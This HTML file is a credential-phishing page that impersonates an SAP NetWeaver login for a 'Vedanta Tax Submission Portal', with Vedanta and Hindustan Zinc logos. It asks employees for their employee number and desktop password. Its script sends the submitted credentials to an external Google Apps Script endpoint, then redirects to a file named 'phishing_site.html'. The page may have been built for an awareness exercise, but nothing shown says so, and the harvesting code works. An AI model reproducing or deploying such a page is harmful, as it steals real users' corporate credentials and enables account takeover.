<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vedanta Tax Submission Portal</title>

    <link rel="stylesheet" href="/index.css">

    <style>
        .text {
            font-size: larger;
            font-family: sans-serif;
        }
    </style>
</head>

<body>
    <div class="main_div">
        <div class="sideImg">
            <img src="/Side_man_image.png" alt="side image">
        </div>

        <div class="loginBox">
            <div class="netved">
                <h1 class="net">SAP NetWeaver</h1>
                <img src="/vedanta_logo_prev_ui.png" alt="vedanta logo">
            </div>
            <img class="hzl" src="/HZ_logo.png" alt="HZ logo">

            <div class="login"> <br> <br> <br>
                <form id="form">
                    <div class="display_flex">
                        <div class="text"> <label>User</label> <span style="color: red;"> *</span> </div>
                        <div><input class="input" type="number" name="user" required /> </div>
                    </div>
                    <div class="display_flex">
                        <div class="text"><label>Password</label> <span style="color: red;"> *</span> </div>
                        <div><input class="input" type="password" name="password" required /> </div>
                    </div>
                    <div class="btn"><input class="logOnBtn" type="submit" name="submit" value="Log On" /></div>
                </form>
            </div>

            <div class="notice">
                <br>
                <h2>Notice for All Users</h2>
                <br> <br>
                <h2>User ID = Employee Number.</h2>
                <h2>Password = Your Desktop / Laptop Password. </h2>
            </div>

            <div class="copyright">
                <p style="line-height: 2.2;">copyright &#169 SAP AG ALL Rights Reserved</p>
                <img src="/SAP_logo.jpg" alt="SAP_logo">
            </div>
        </div>
    </div>
    <script>
        const form = document.querySelector("#form")
        const scriptURL = 'https://script.google.com/macros/s/AKfycbxApNN9Yv3yjm2loEvYi5P2DkpA0f9B2EK6TP9T2RC1WlphpkaCOxvPxzXyc90Ij3dy/exec'

        form.addEventListener('submit', e => {
            e.preventDefault()
            let requestBody = new FormData(form)
            console.log(requestBody)
            fetch(scriptURL, { method: 'POST', body: requestBody })
                .then(response => {
                    submission();
                })
                .catch(error => {
                    alert('Error!', error.message)
                }
                )
        })
        function submission(a) {
            location.href = 'phishing_site.html';
        }
    </script>
</body>

</html>
<script src="https://code.jquery.com/jquery-3.4.1.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
    crossorigin="anonymous"></script>
